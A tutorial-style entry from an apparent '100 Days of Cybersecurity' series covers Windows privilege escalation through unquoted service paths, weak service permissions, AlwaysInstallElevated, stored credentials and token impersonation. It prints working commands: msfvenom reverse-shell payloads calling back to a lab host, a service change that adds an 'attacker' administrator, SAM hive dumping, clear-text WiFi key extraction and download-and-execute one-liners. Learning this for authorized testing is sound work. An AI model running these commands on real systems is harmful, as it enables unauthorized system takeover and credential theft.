# Day 036 - Privilege Escalation: Windows

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

Yesterday: Linux privesc.

Today: Windows. Same goal - low privilege to SYSTEM - completely different attack surface.

Windows privilege escalation leverages Windows-specific misconfigurations: unquoted service paths, weak registry permissions, stored credentials, token impersonation, and AlwaysInstallElevated policies.

Most enterprise environments run Windows. Understanding Windows privesc is essential for real-world engagements.

---

## 🔍 Initial Enumeration

```cmd
:: Who am I?
whoami
whoami /priv                    :: privileges - look for SeImpersonatePrivilege
whoami /groups                  :: group memberships
net user %username%             :: detailed user info
net localgroup administrators   :: who's in the admin group?

:: System info
systeminfo                      :: OS version, patches, hotfixes
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"

:: Network
ipconfig /all
netstat -ano                    :: listening ports + PIDs
route print
```

---

## 🎯 Path 1 - Unquoted Service Paths

Windows services run executables. If the path contains spaces and isn't quoted - Windows searches for the binary in each space-separated directory.

```
Service path: C:\Program Files\Vulnerable App\service.exe

Windows searches in order:
1. C:\Program.exe           ← if this exists, it runs first
2. C:\Program Files\Vulnerable.exe
3. C:\Program Files\Vulnerable App\service.exe

If you can write to C:\Program Files\ → plant C:\Program Files\Vulnerable.exe
Wait for service restart → your binary runs as SYSTEM
```

**Finding unquoted service paths:**
```cmd
:: List all services with unquoted paths containing spaces
wmic service get name,displayname,pathname,startmode \
  | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

:: PowerShell version
Get-WmiObject win32_service | Select-Object Name, State, PathName \
  | Where-Object {$_.PathName -notmatch '"'}
```

**Exploiting:**
```cmd
:: Generate malicious binary with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 \
  -f exe -o "Vulnerable.exe"

:: Place in exploitable path
copy Vulnerable.exe "C:\Program Files\Vulnerable.exe"

:: Wait for/trigger service restart
sc stop VulnerableService
sc start VulnerableService
```

---

## 🎯 Path 2 - Weak Service Permissions

If you have permission to modify a service's binary path - change it to run your payload.

```cmd
:: Check service permissions with accesschk (Sysinternals)
accesschk.exe -uwcqv "Users" *         :: services Users can modify
accesschk.exe -uwcqv "Everyone" *

:: PowerShell
Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService" | Format-List

:: If writable - change the binary path
sc config VulnService binPath= "cmd.exe /k net localgroup administrators attacker /add"
sc stop VulnService
sc start VulnService
:: Service fails to start but command executes as SYSTEM first
```

---

## 🎯 Path 3 - AlwaysInstallElevated

If this registry key is set to 1 for both HKCU and HKLM - any user can install MSI packages as SYSTEM.

```cmd
:: Check registry keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: If both return 1 - vulnerable
:: Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 \
  -f msi -o evil.msi

:: Install it - runs as SYSTEM
msiexec /quiet /qn /i evil.msi
```

---

## 🎯 Path 4 - Stored Credentials

Windows stores credentials in several places.

```cmd
:: Windows Credential Manager
cmdkey /list                           :: stored credentials
runas /savecred /user:admin cmd.exe    :: use stored credential

:: Registry - autologon credentials (common in kiosk setups)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
:: Look for DefaultPassword, DefaultUsername

:: Unattended installation files (left after Windows setup)
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\sysprep\sysprep.xml
:: Often contain base64-encoded administrator passwords

:: WiFi passwords
netsh wlan show profile
netsh wlan show profile name="NetworkName" key=clear
:: Key Content = plaintext password

:: SAM database (offline - copy to Kali to crack)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
:: Transfer to Kali: python3 impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

---

## 🎯 Path 5 - Token Impersonation (Potato Attacks)

If your user has `SeImpersonatePrivilege` (common for service accounts like IIS, MSSQL) - you can impersonate SYSTEM tokens.

```cmd
:: Check for SeImpersonatePrivilege
whoami /priv
:: SeImpersonatePrivilege  Impersonate a client after authentication  Enabled

:: Tools that exploit this:
:: JuicyPotato  → works on Windows < Server 2019
:: PrintSpoofer → works on Windows 10/Server 2019+
:: RoguePotato  → modern alternative

:: PrintSpoofer example:
PrintSpoofer.exe -i -c cmd
:: Spawns SYSTEM shell
```

---

## 🤖 WinPEAS - Automated Enumeration

```powershell
:: Download and run WinPEAS
certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.exe winpeas.exe
.\winpeas.exe

:: Or PowerShell version (no binary needed)
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
```

---

## 📝 Win PrivEsc Reference Card

```
win_privesc.md - Quick Reference

CHECK ORDER:
1. whoami /priv          → SeImpersonatePrivilege → Potato attacks
2. Unquoted service paths → writeable directory → binary planting
3. AlwaysInstallElevated  → both keys = 1 → MSI install as SYSTEM
4. Weak service perms     → modify binPath → arbitrary command as SYSTEM
5. Stored credentials     → cmdkey, registry, unattend.xml, WiFi
6. Scheduled tasks        → writable scripts run by SYSTEM
7. Kernel exploits        → systeminfo → Watson/wesng → patch gaps

TOOLS:
WinPEAS     → automated enumeration
PowerUp     → PowerShell privesc checks
Watson      → .NET kernel exploit suggester
accesschk   → Sysinternals service/file ACL checker
PrintSpoofer → SeImpersonate → SYSTEM
JuicyPotato → SeImpersonate → SYSTEM (pre-Server 2019)
```

---

## 🔑 Key Takeaways

- `whoami /priv` first - SeImpersonatePrivilege is an instant SYSTEM path
- Unquoted service paths with spaces are consistently found in enterprise environments
- AlwaysInstallElevated is a Group Policy misconfiguration - check it every time
- Unattend.xml files are frequently left on systems after imaging - contain admin passwords
- WinPEAS automates everything - use it on every Windows target
- Windows privesc often requires rebooting/restarting services - confirm this is allowed in ROE

---

## 📚 Resources
- [GTFOBins Windows equivalent: LOLBAS](https://lolbas-project.github.io/)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [TryHackMe - Windows PrivEsc Room (free)](https://tryhackme.com/room/windows10privesc)
- [PayloadsAllTheThings - Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

---

## [⬅️ Day 035](../day035/) | [➡️ Day 037](../day037/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*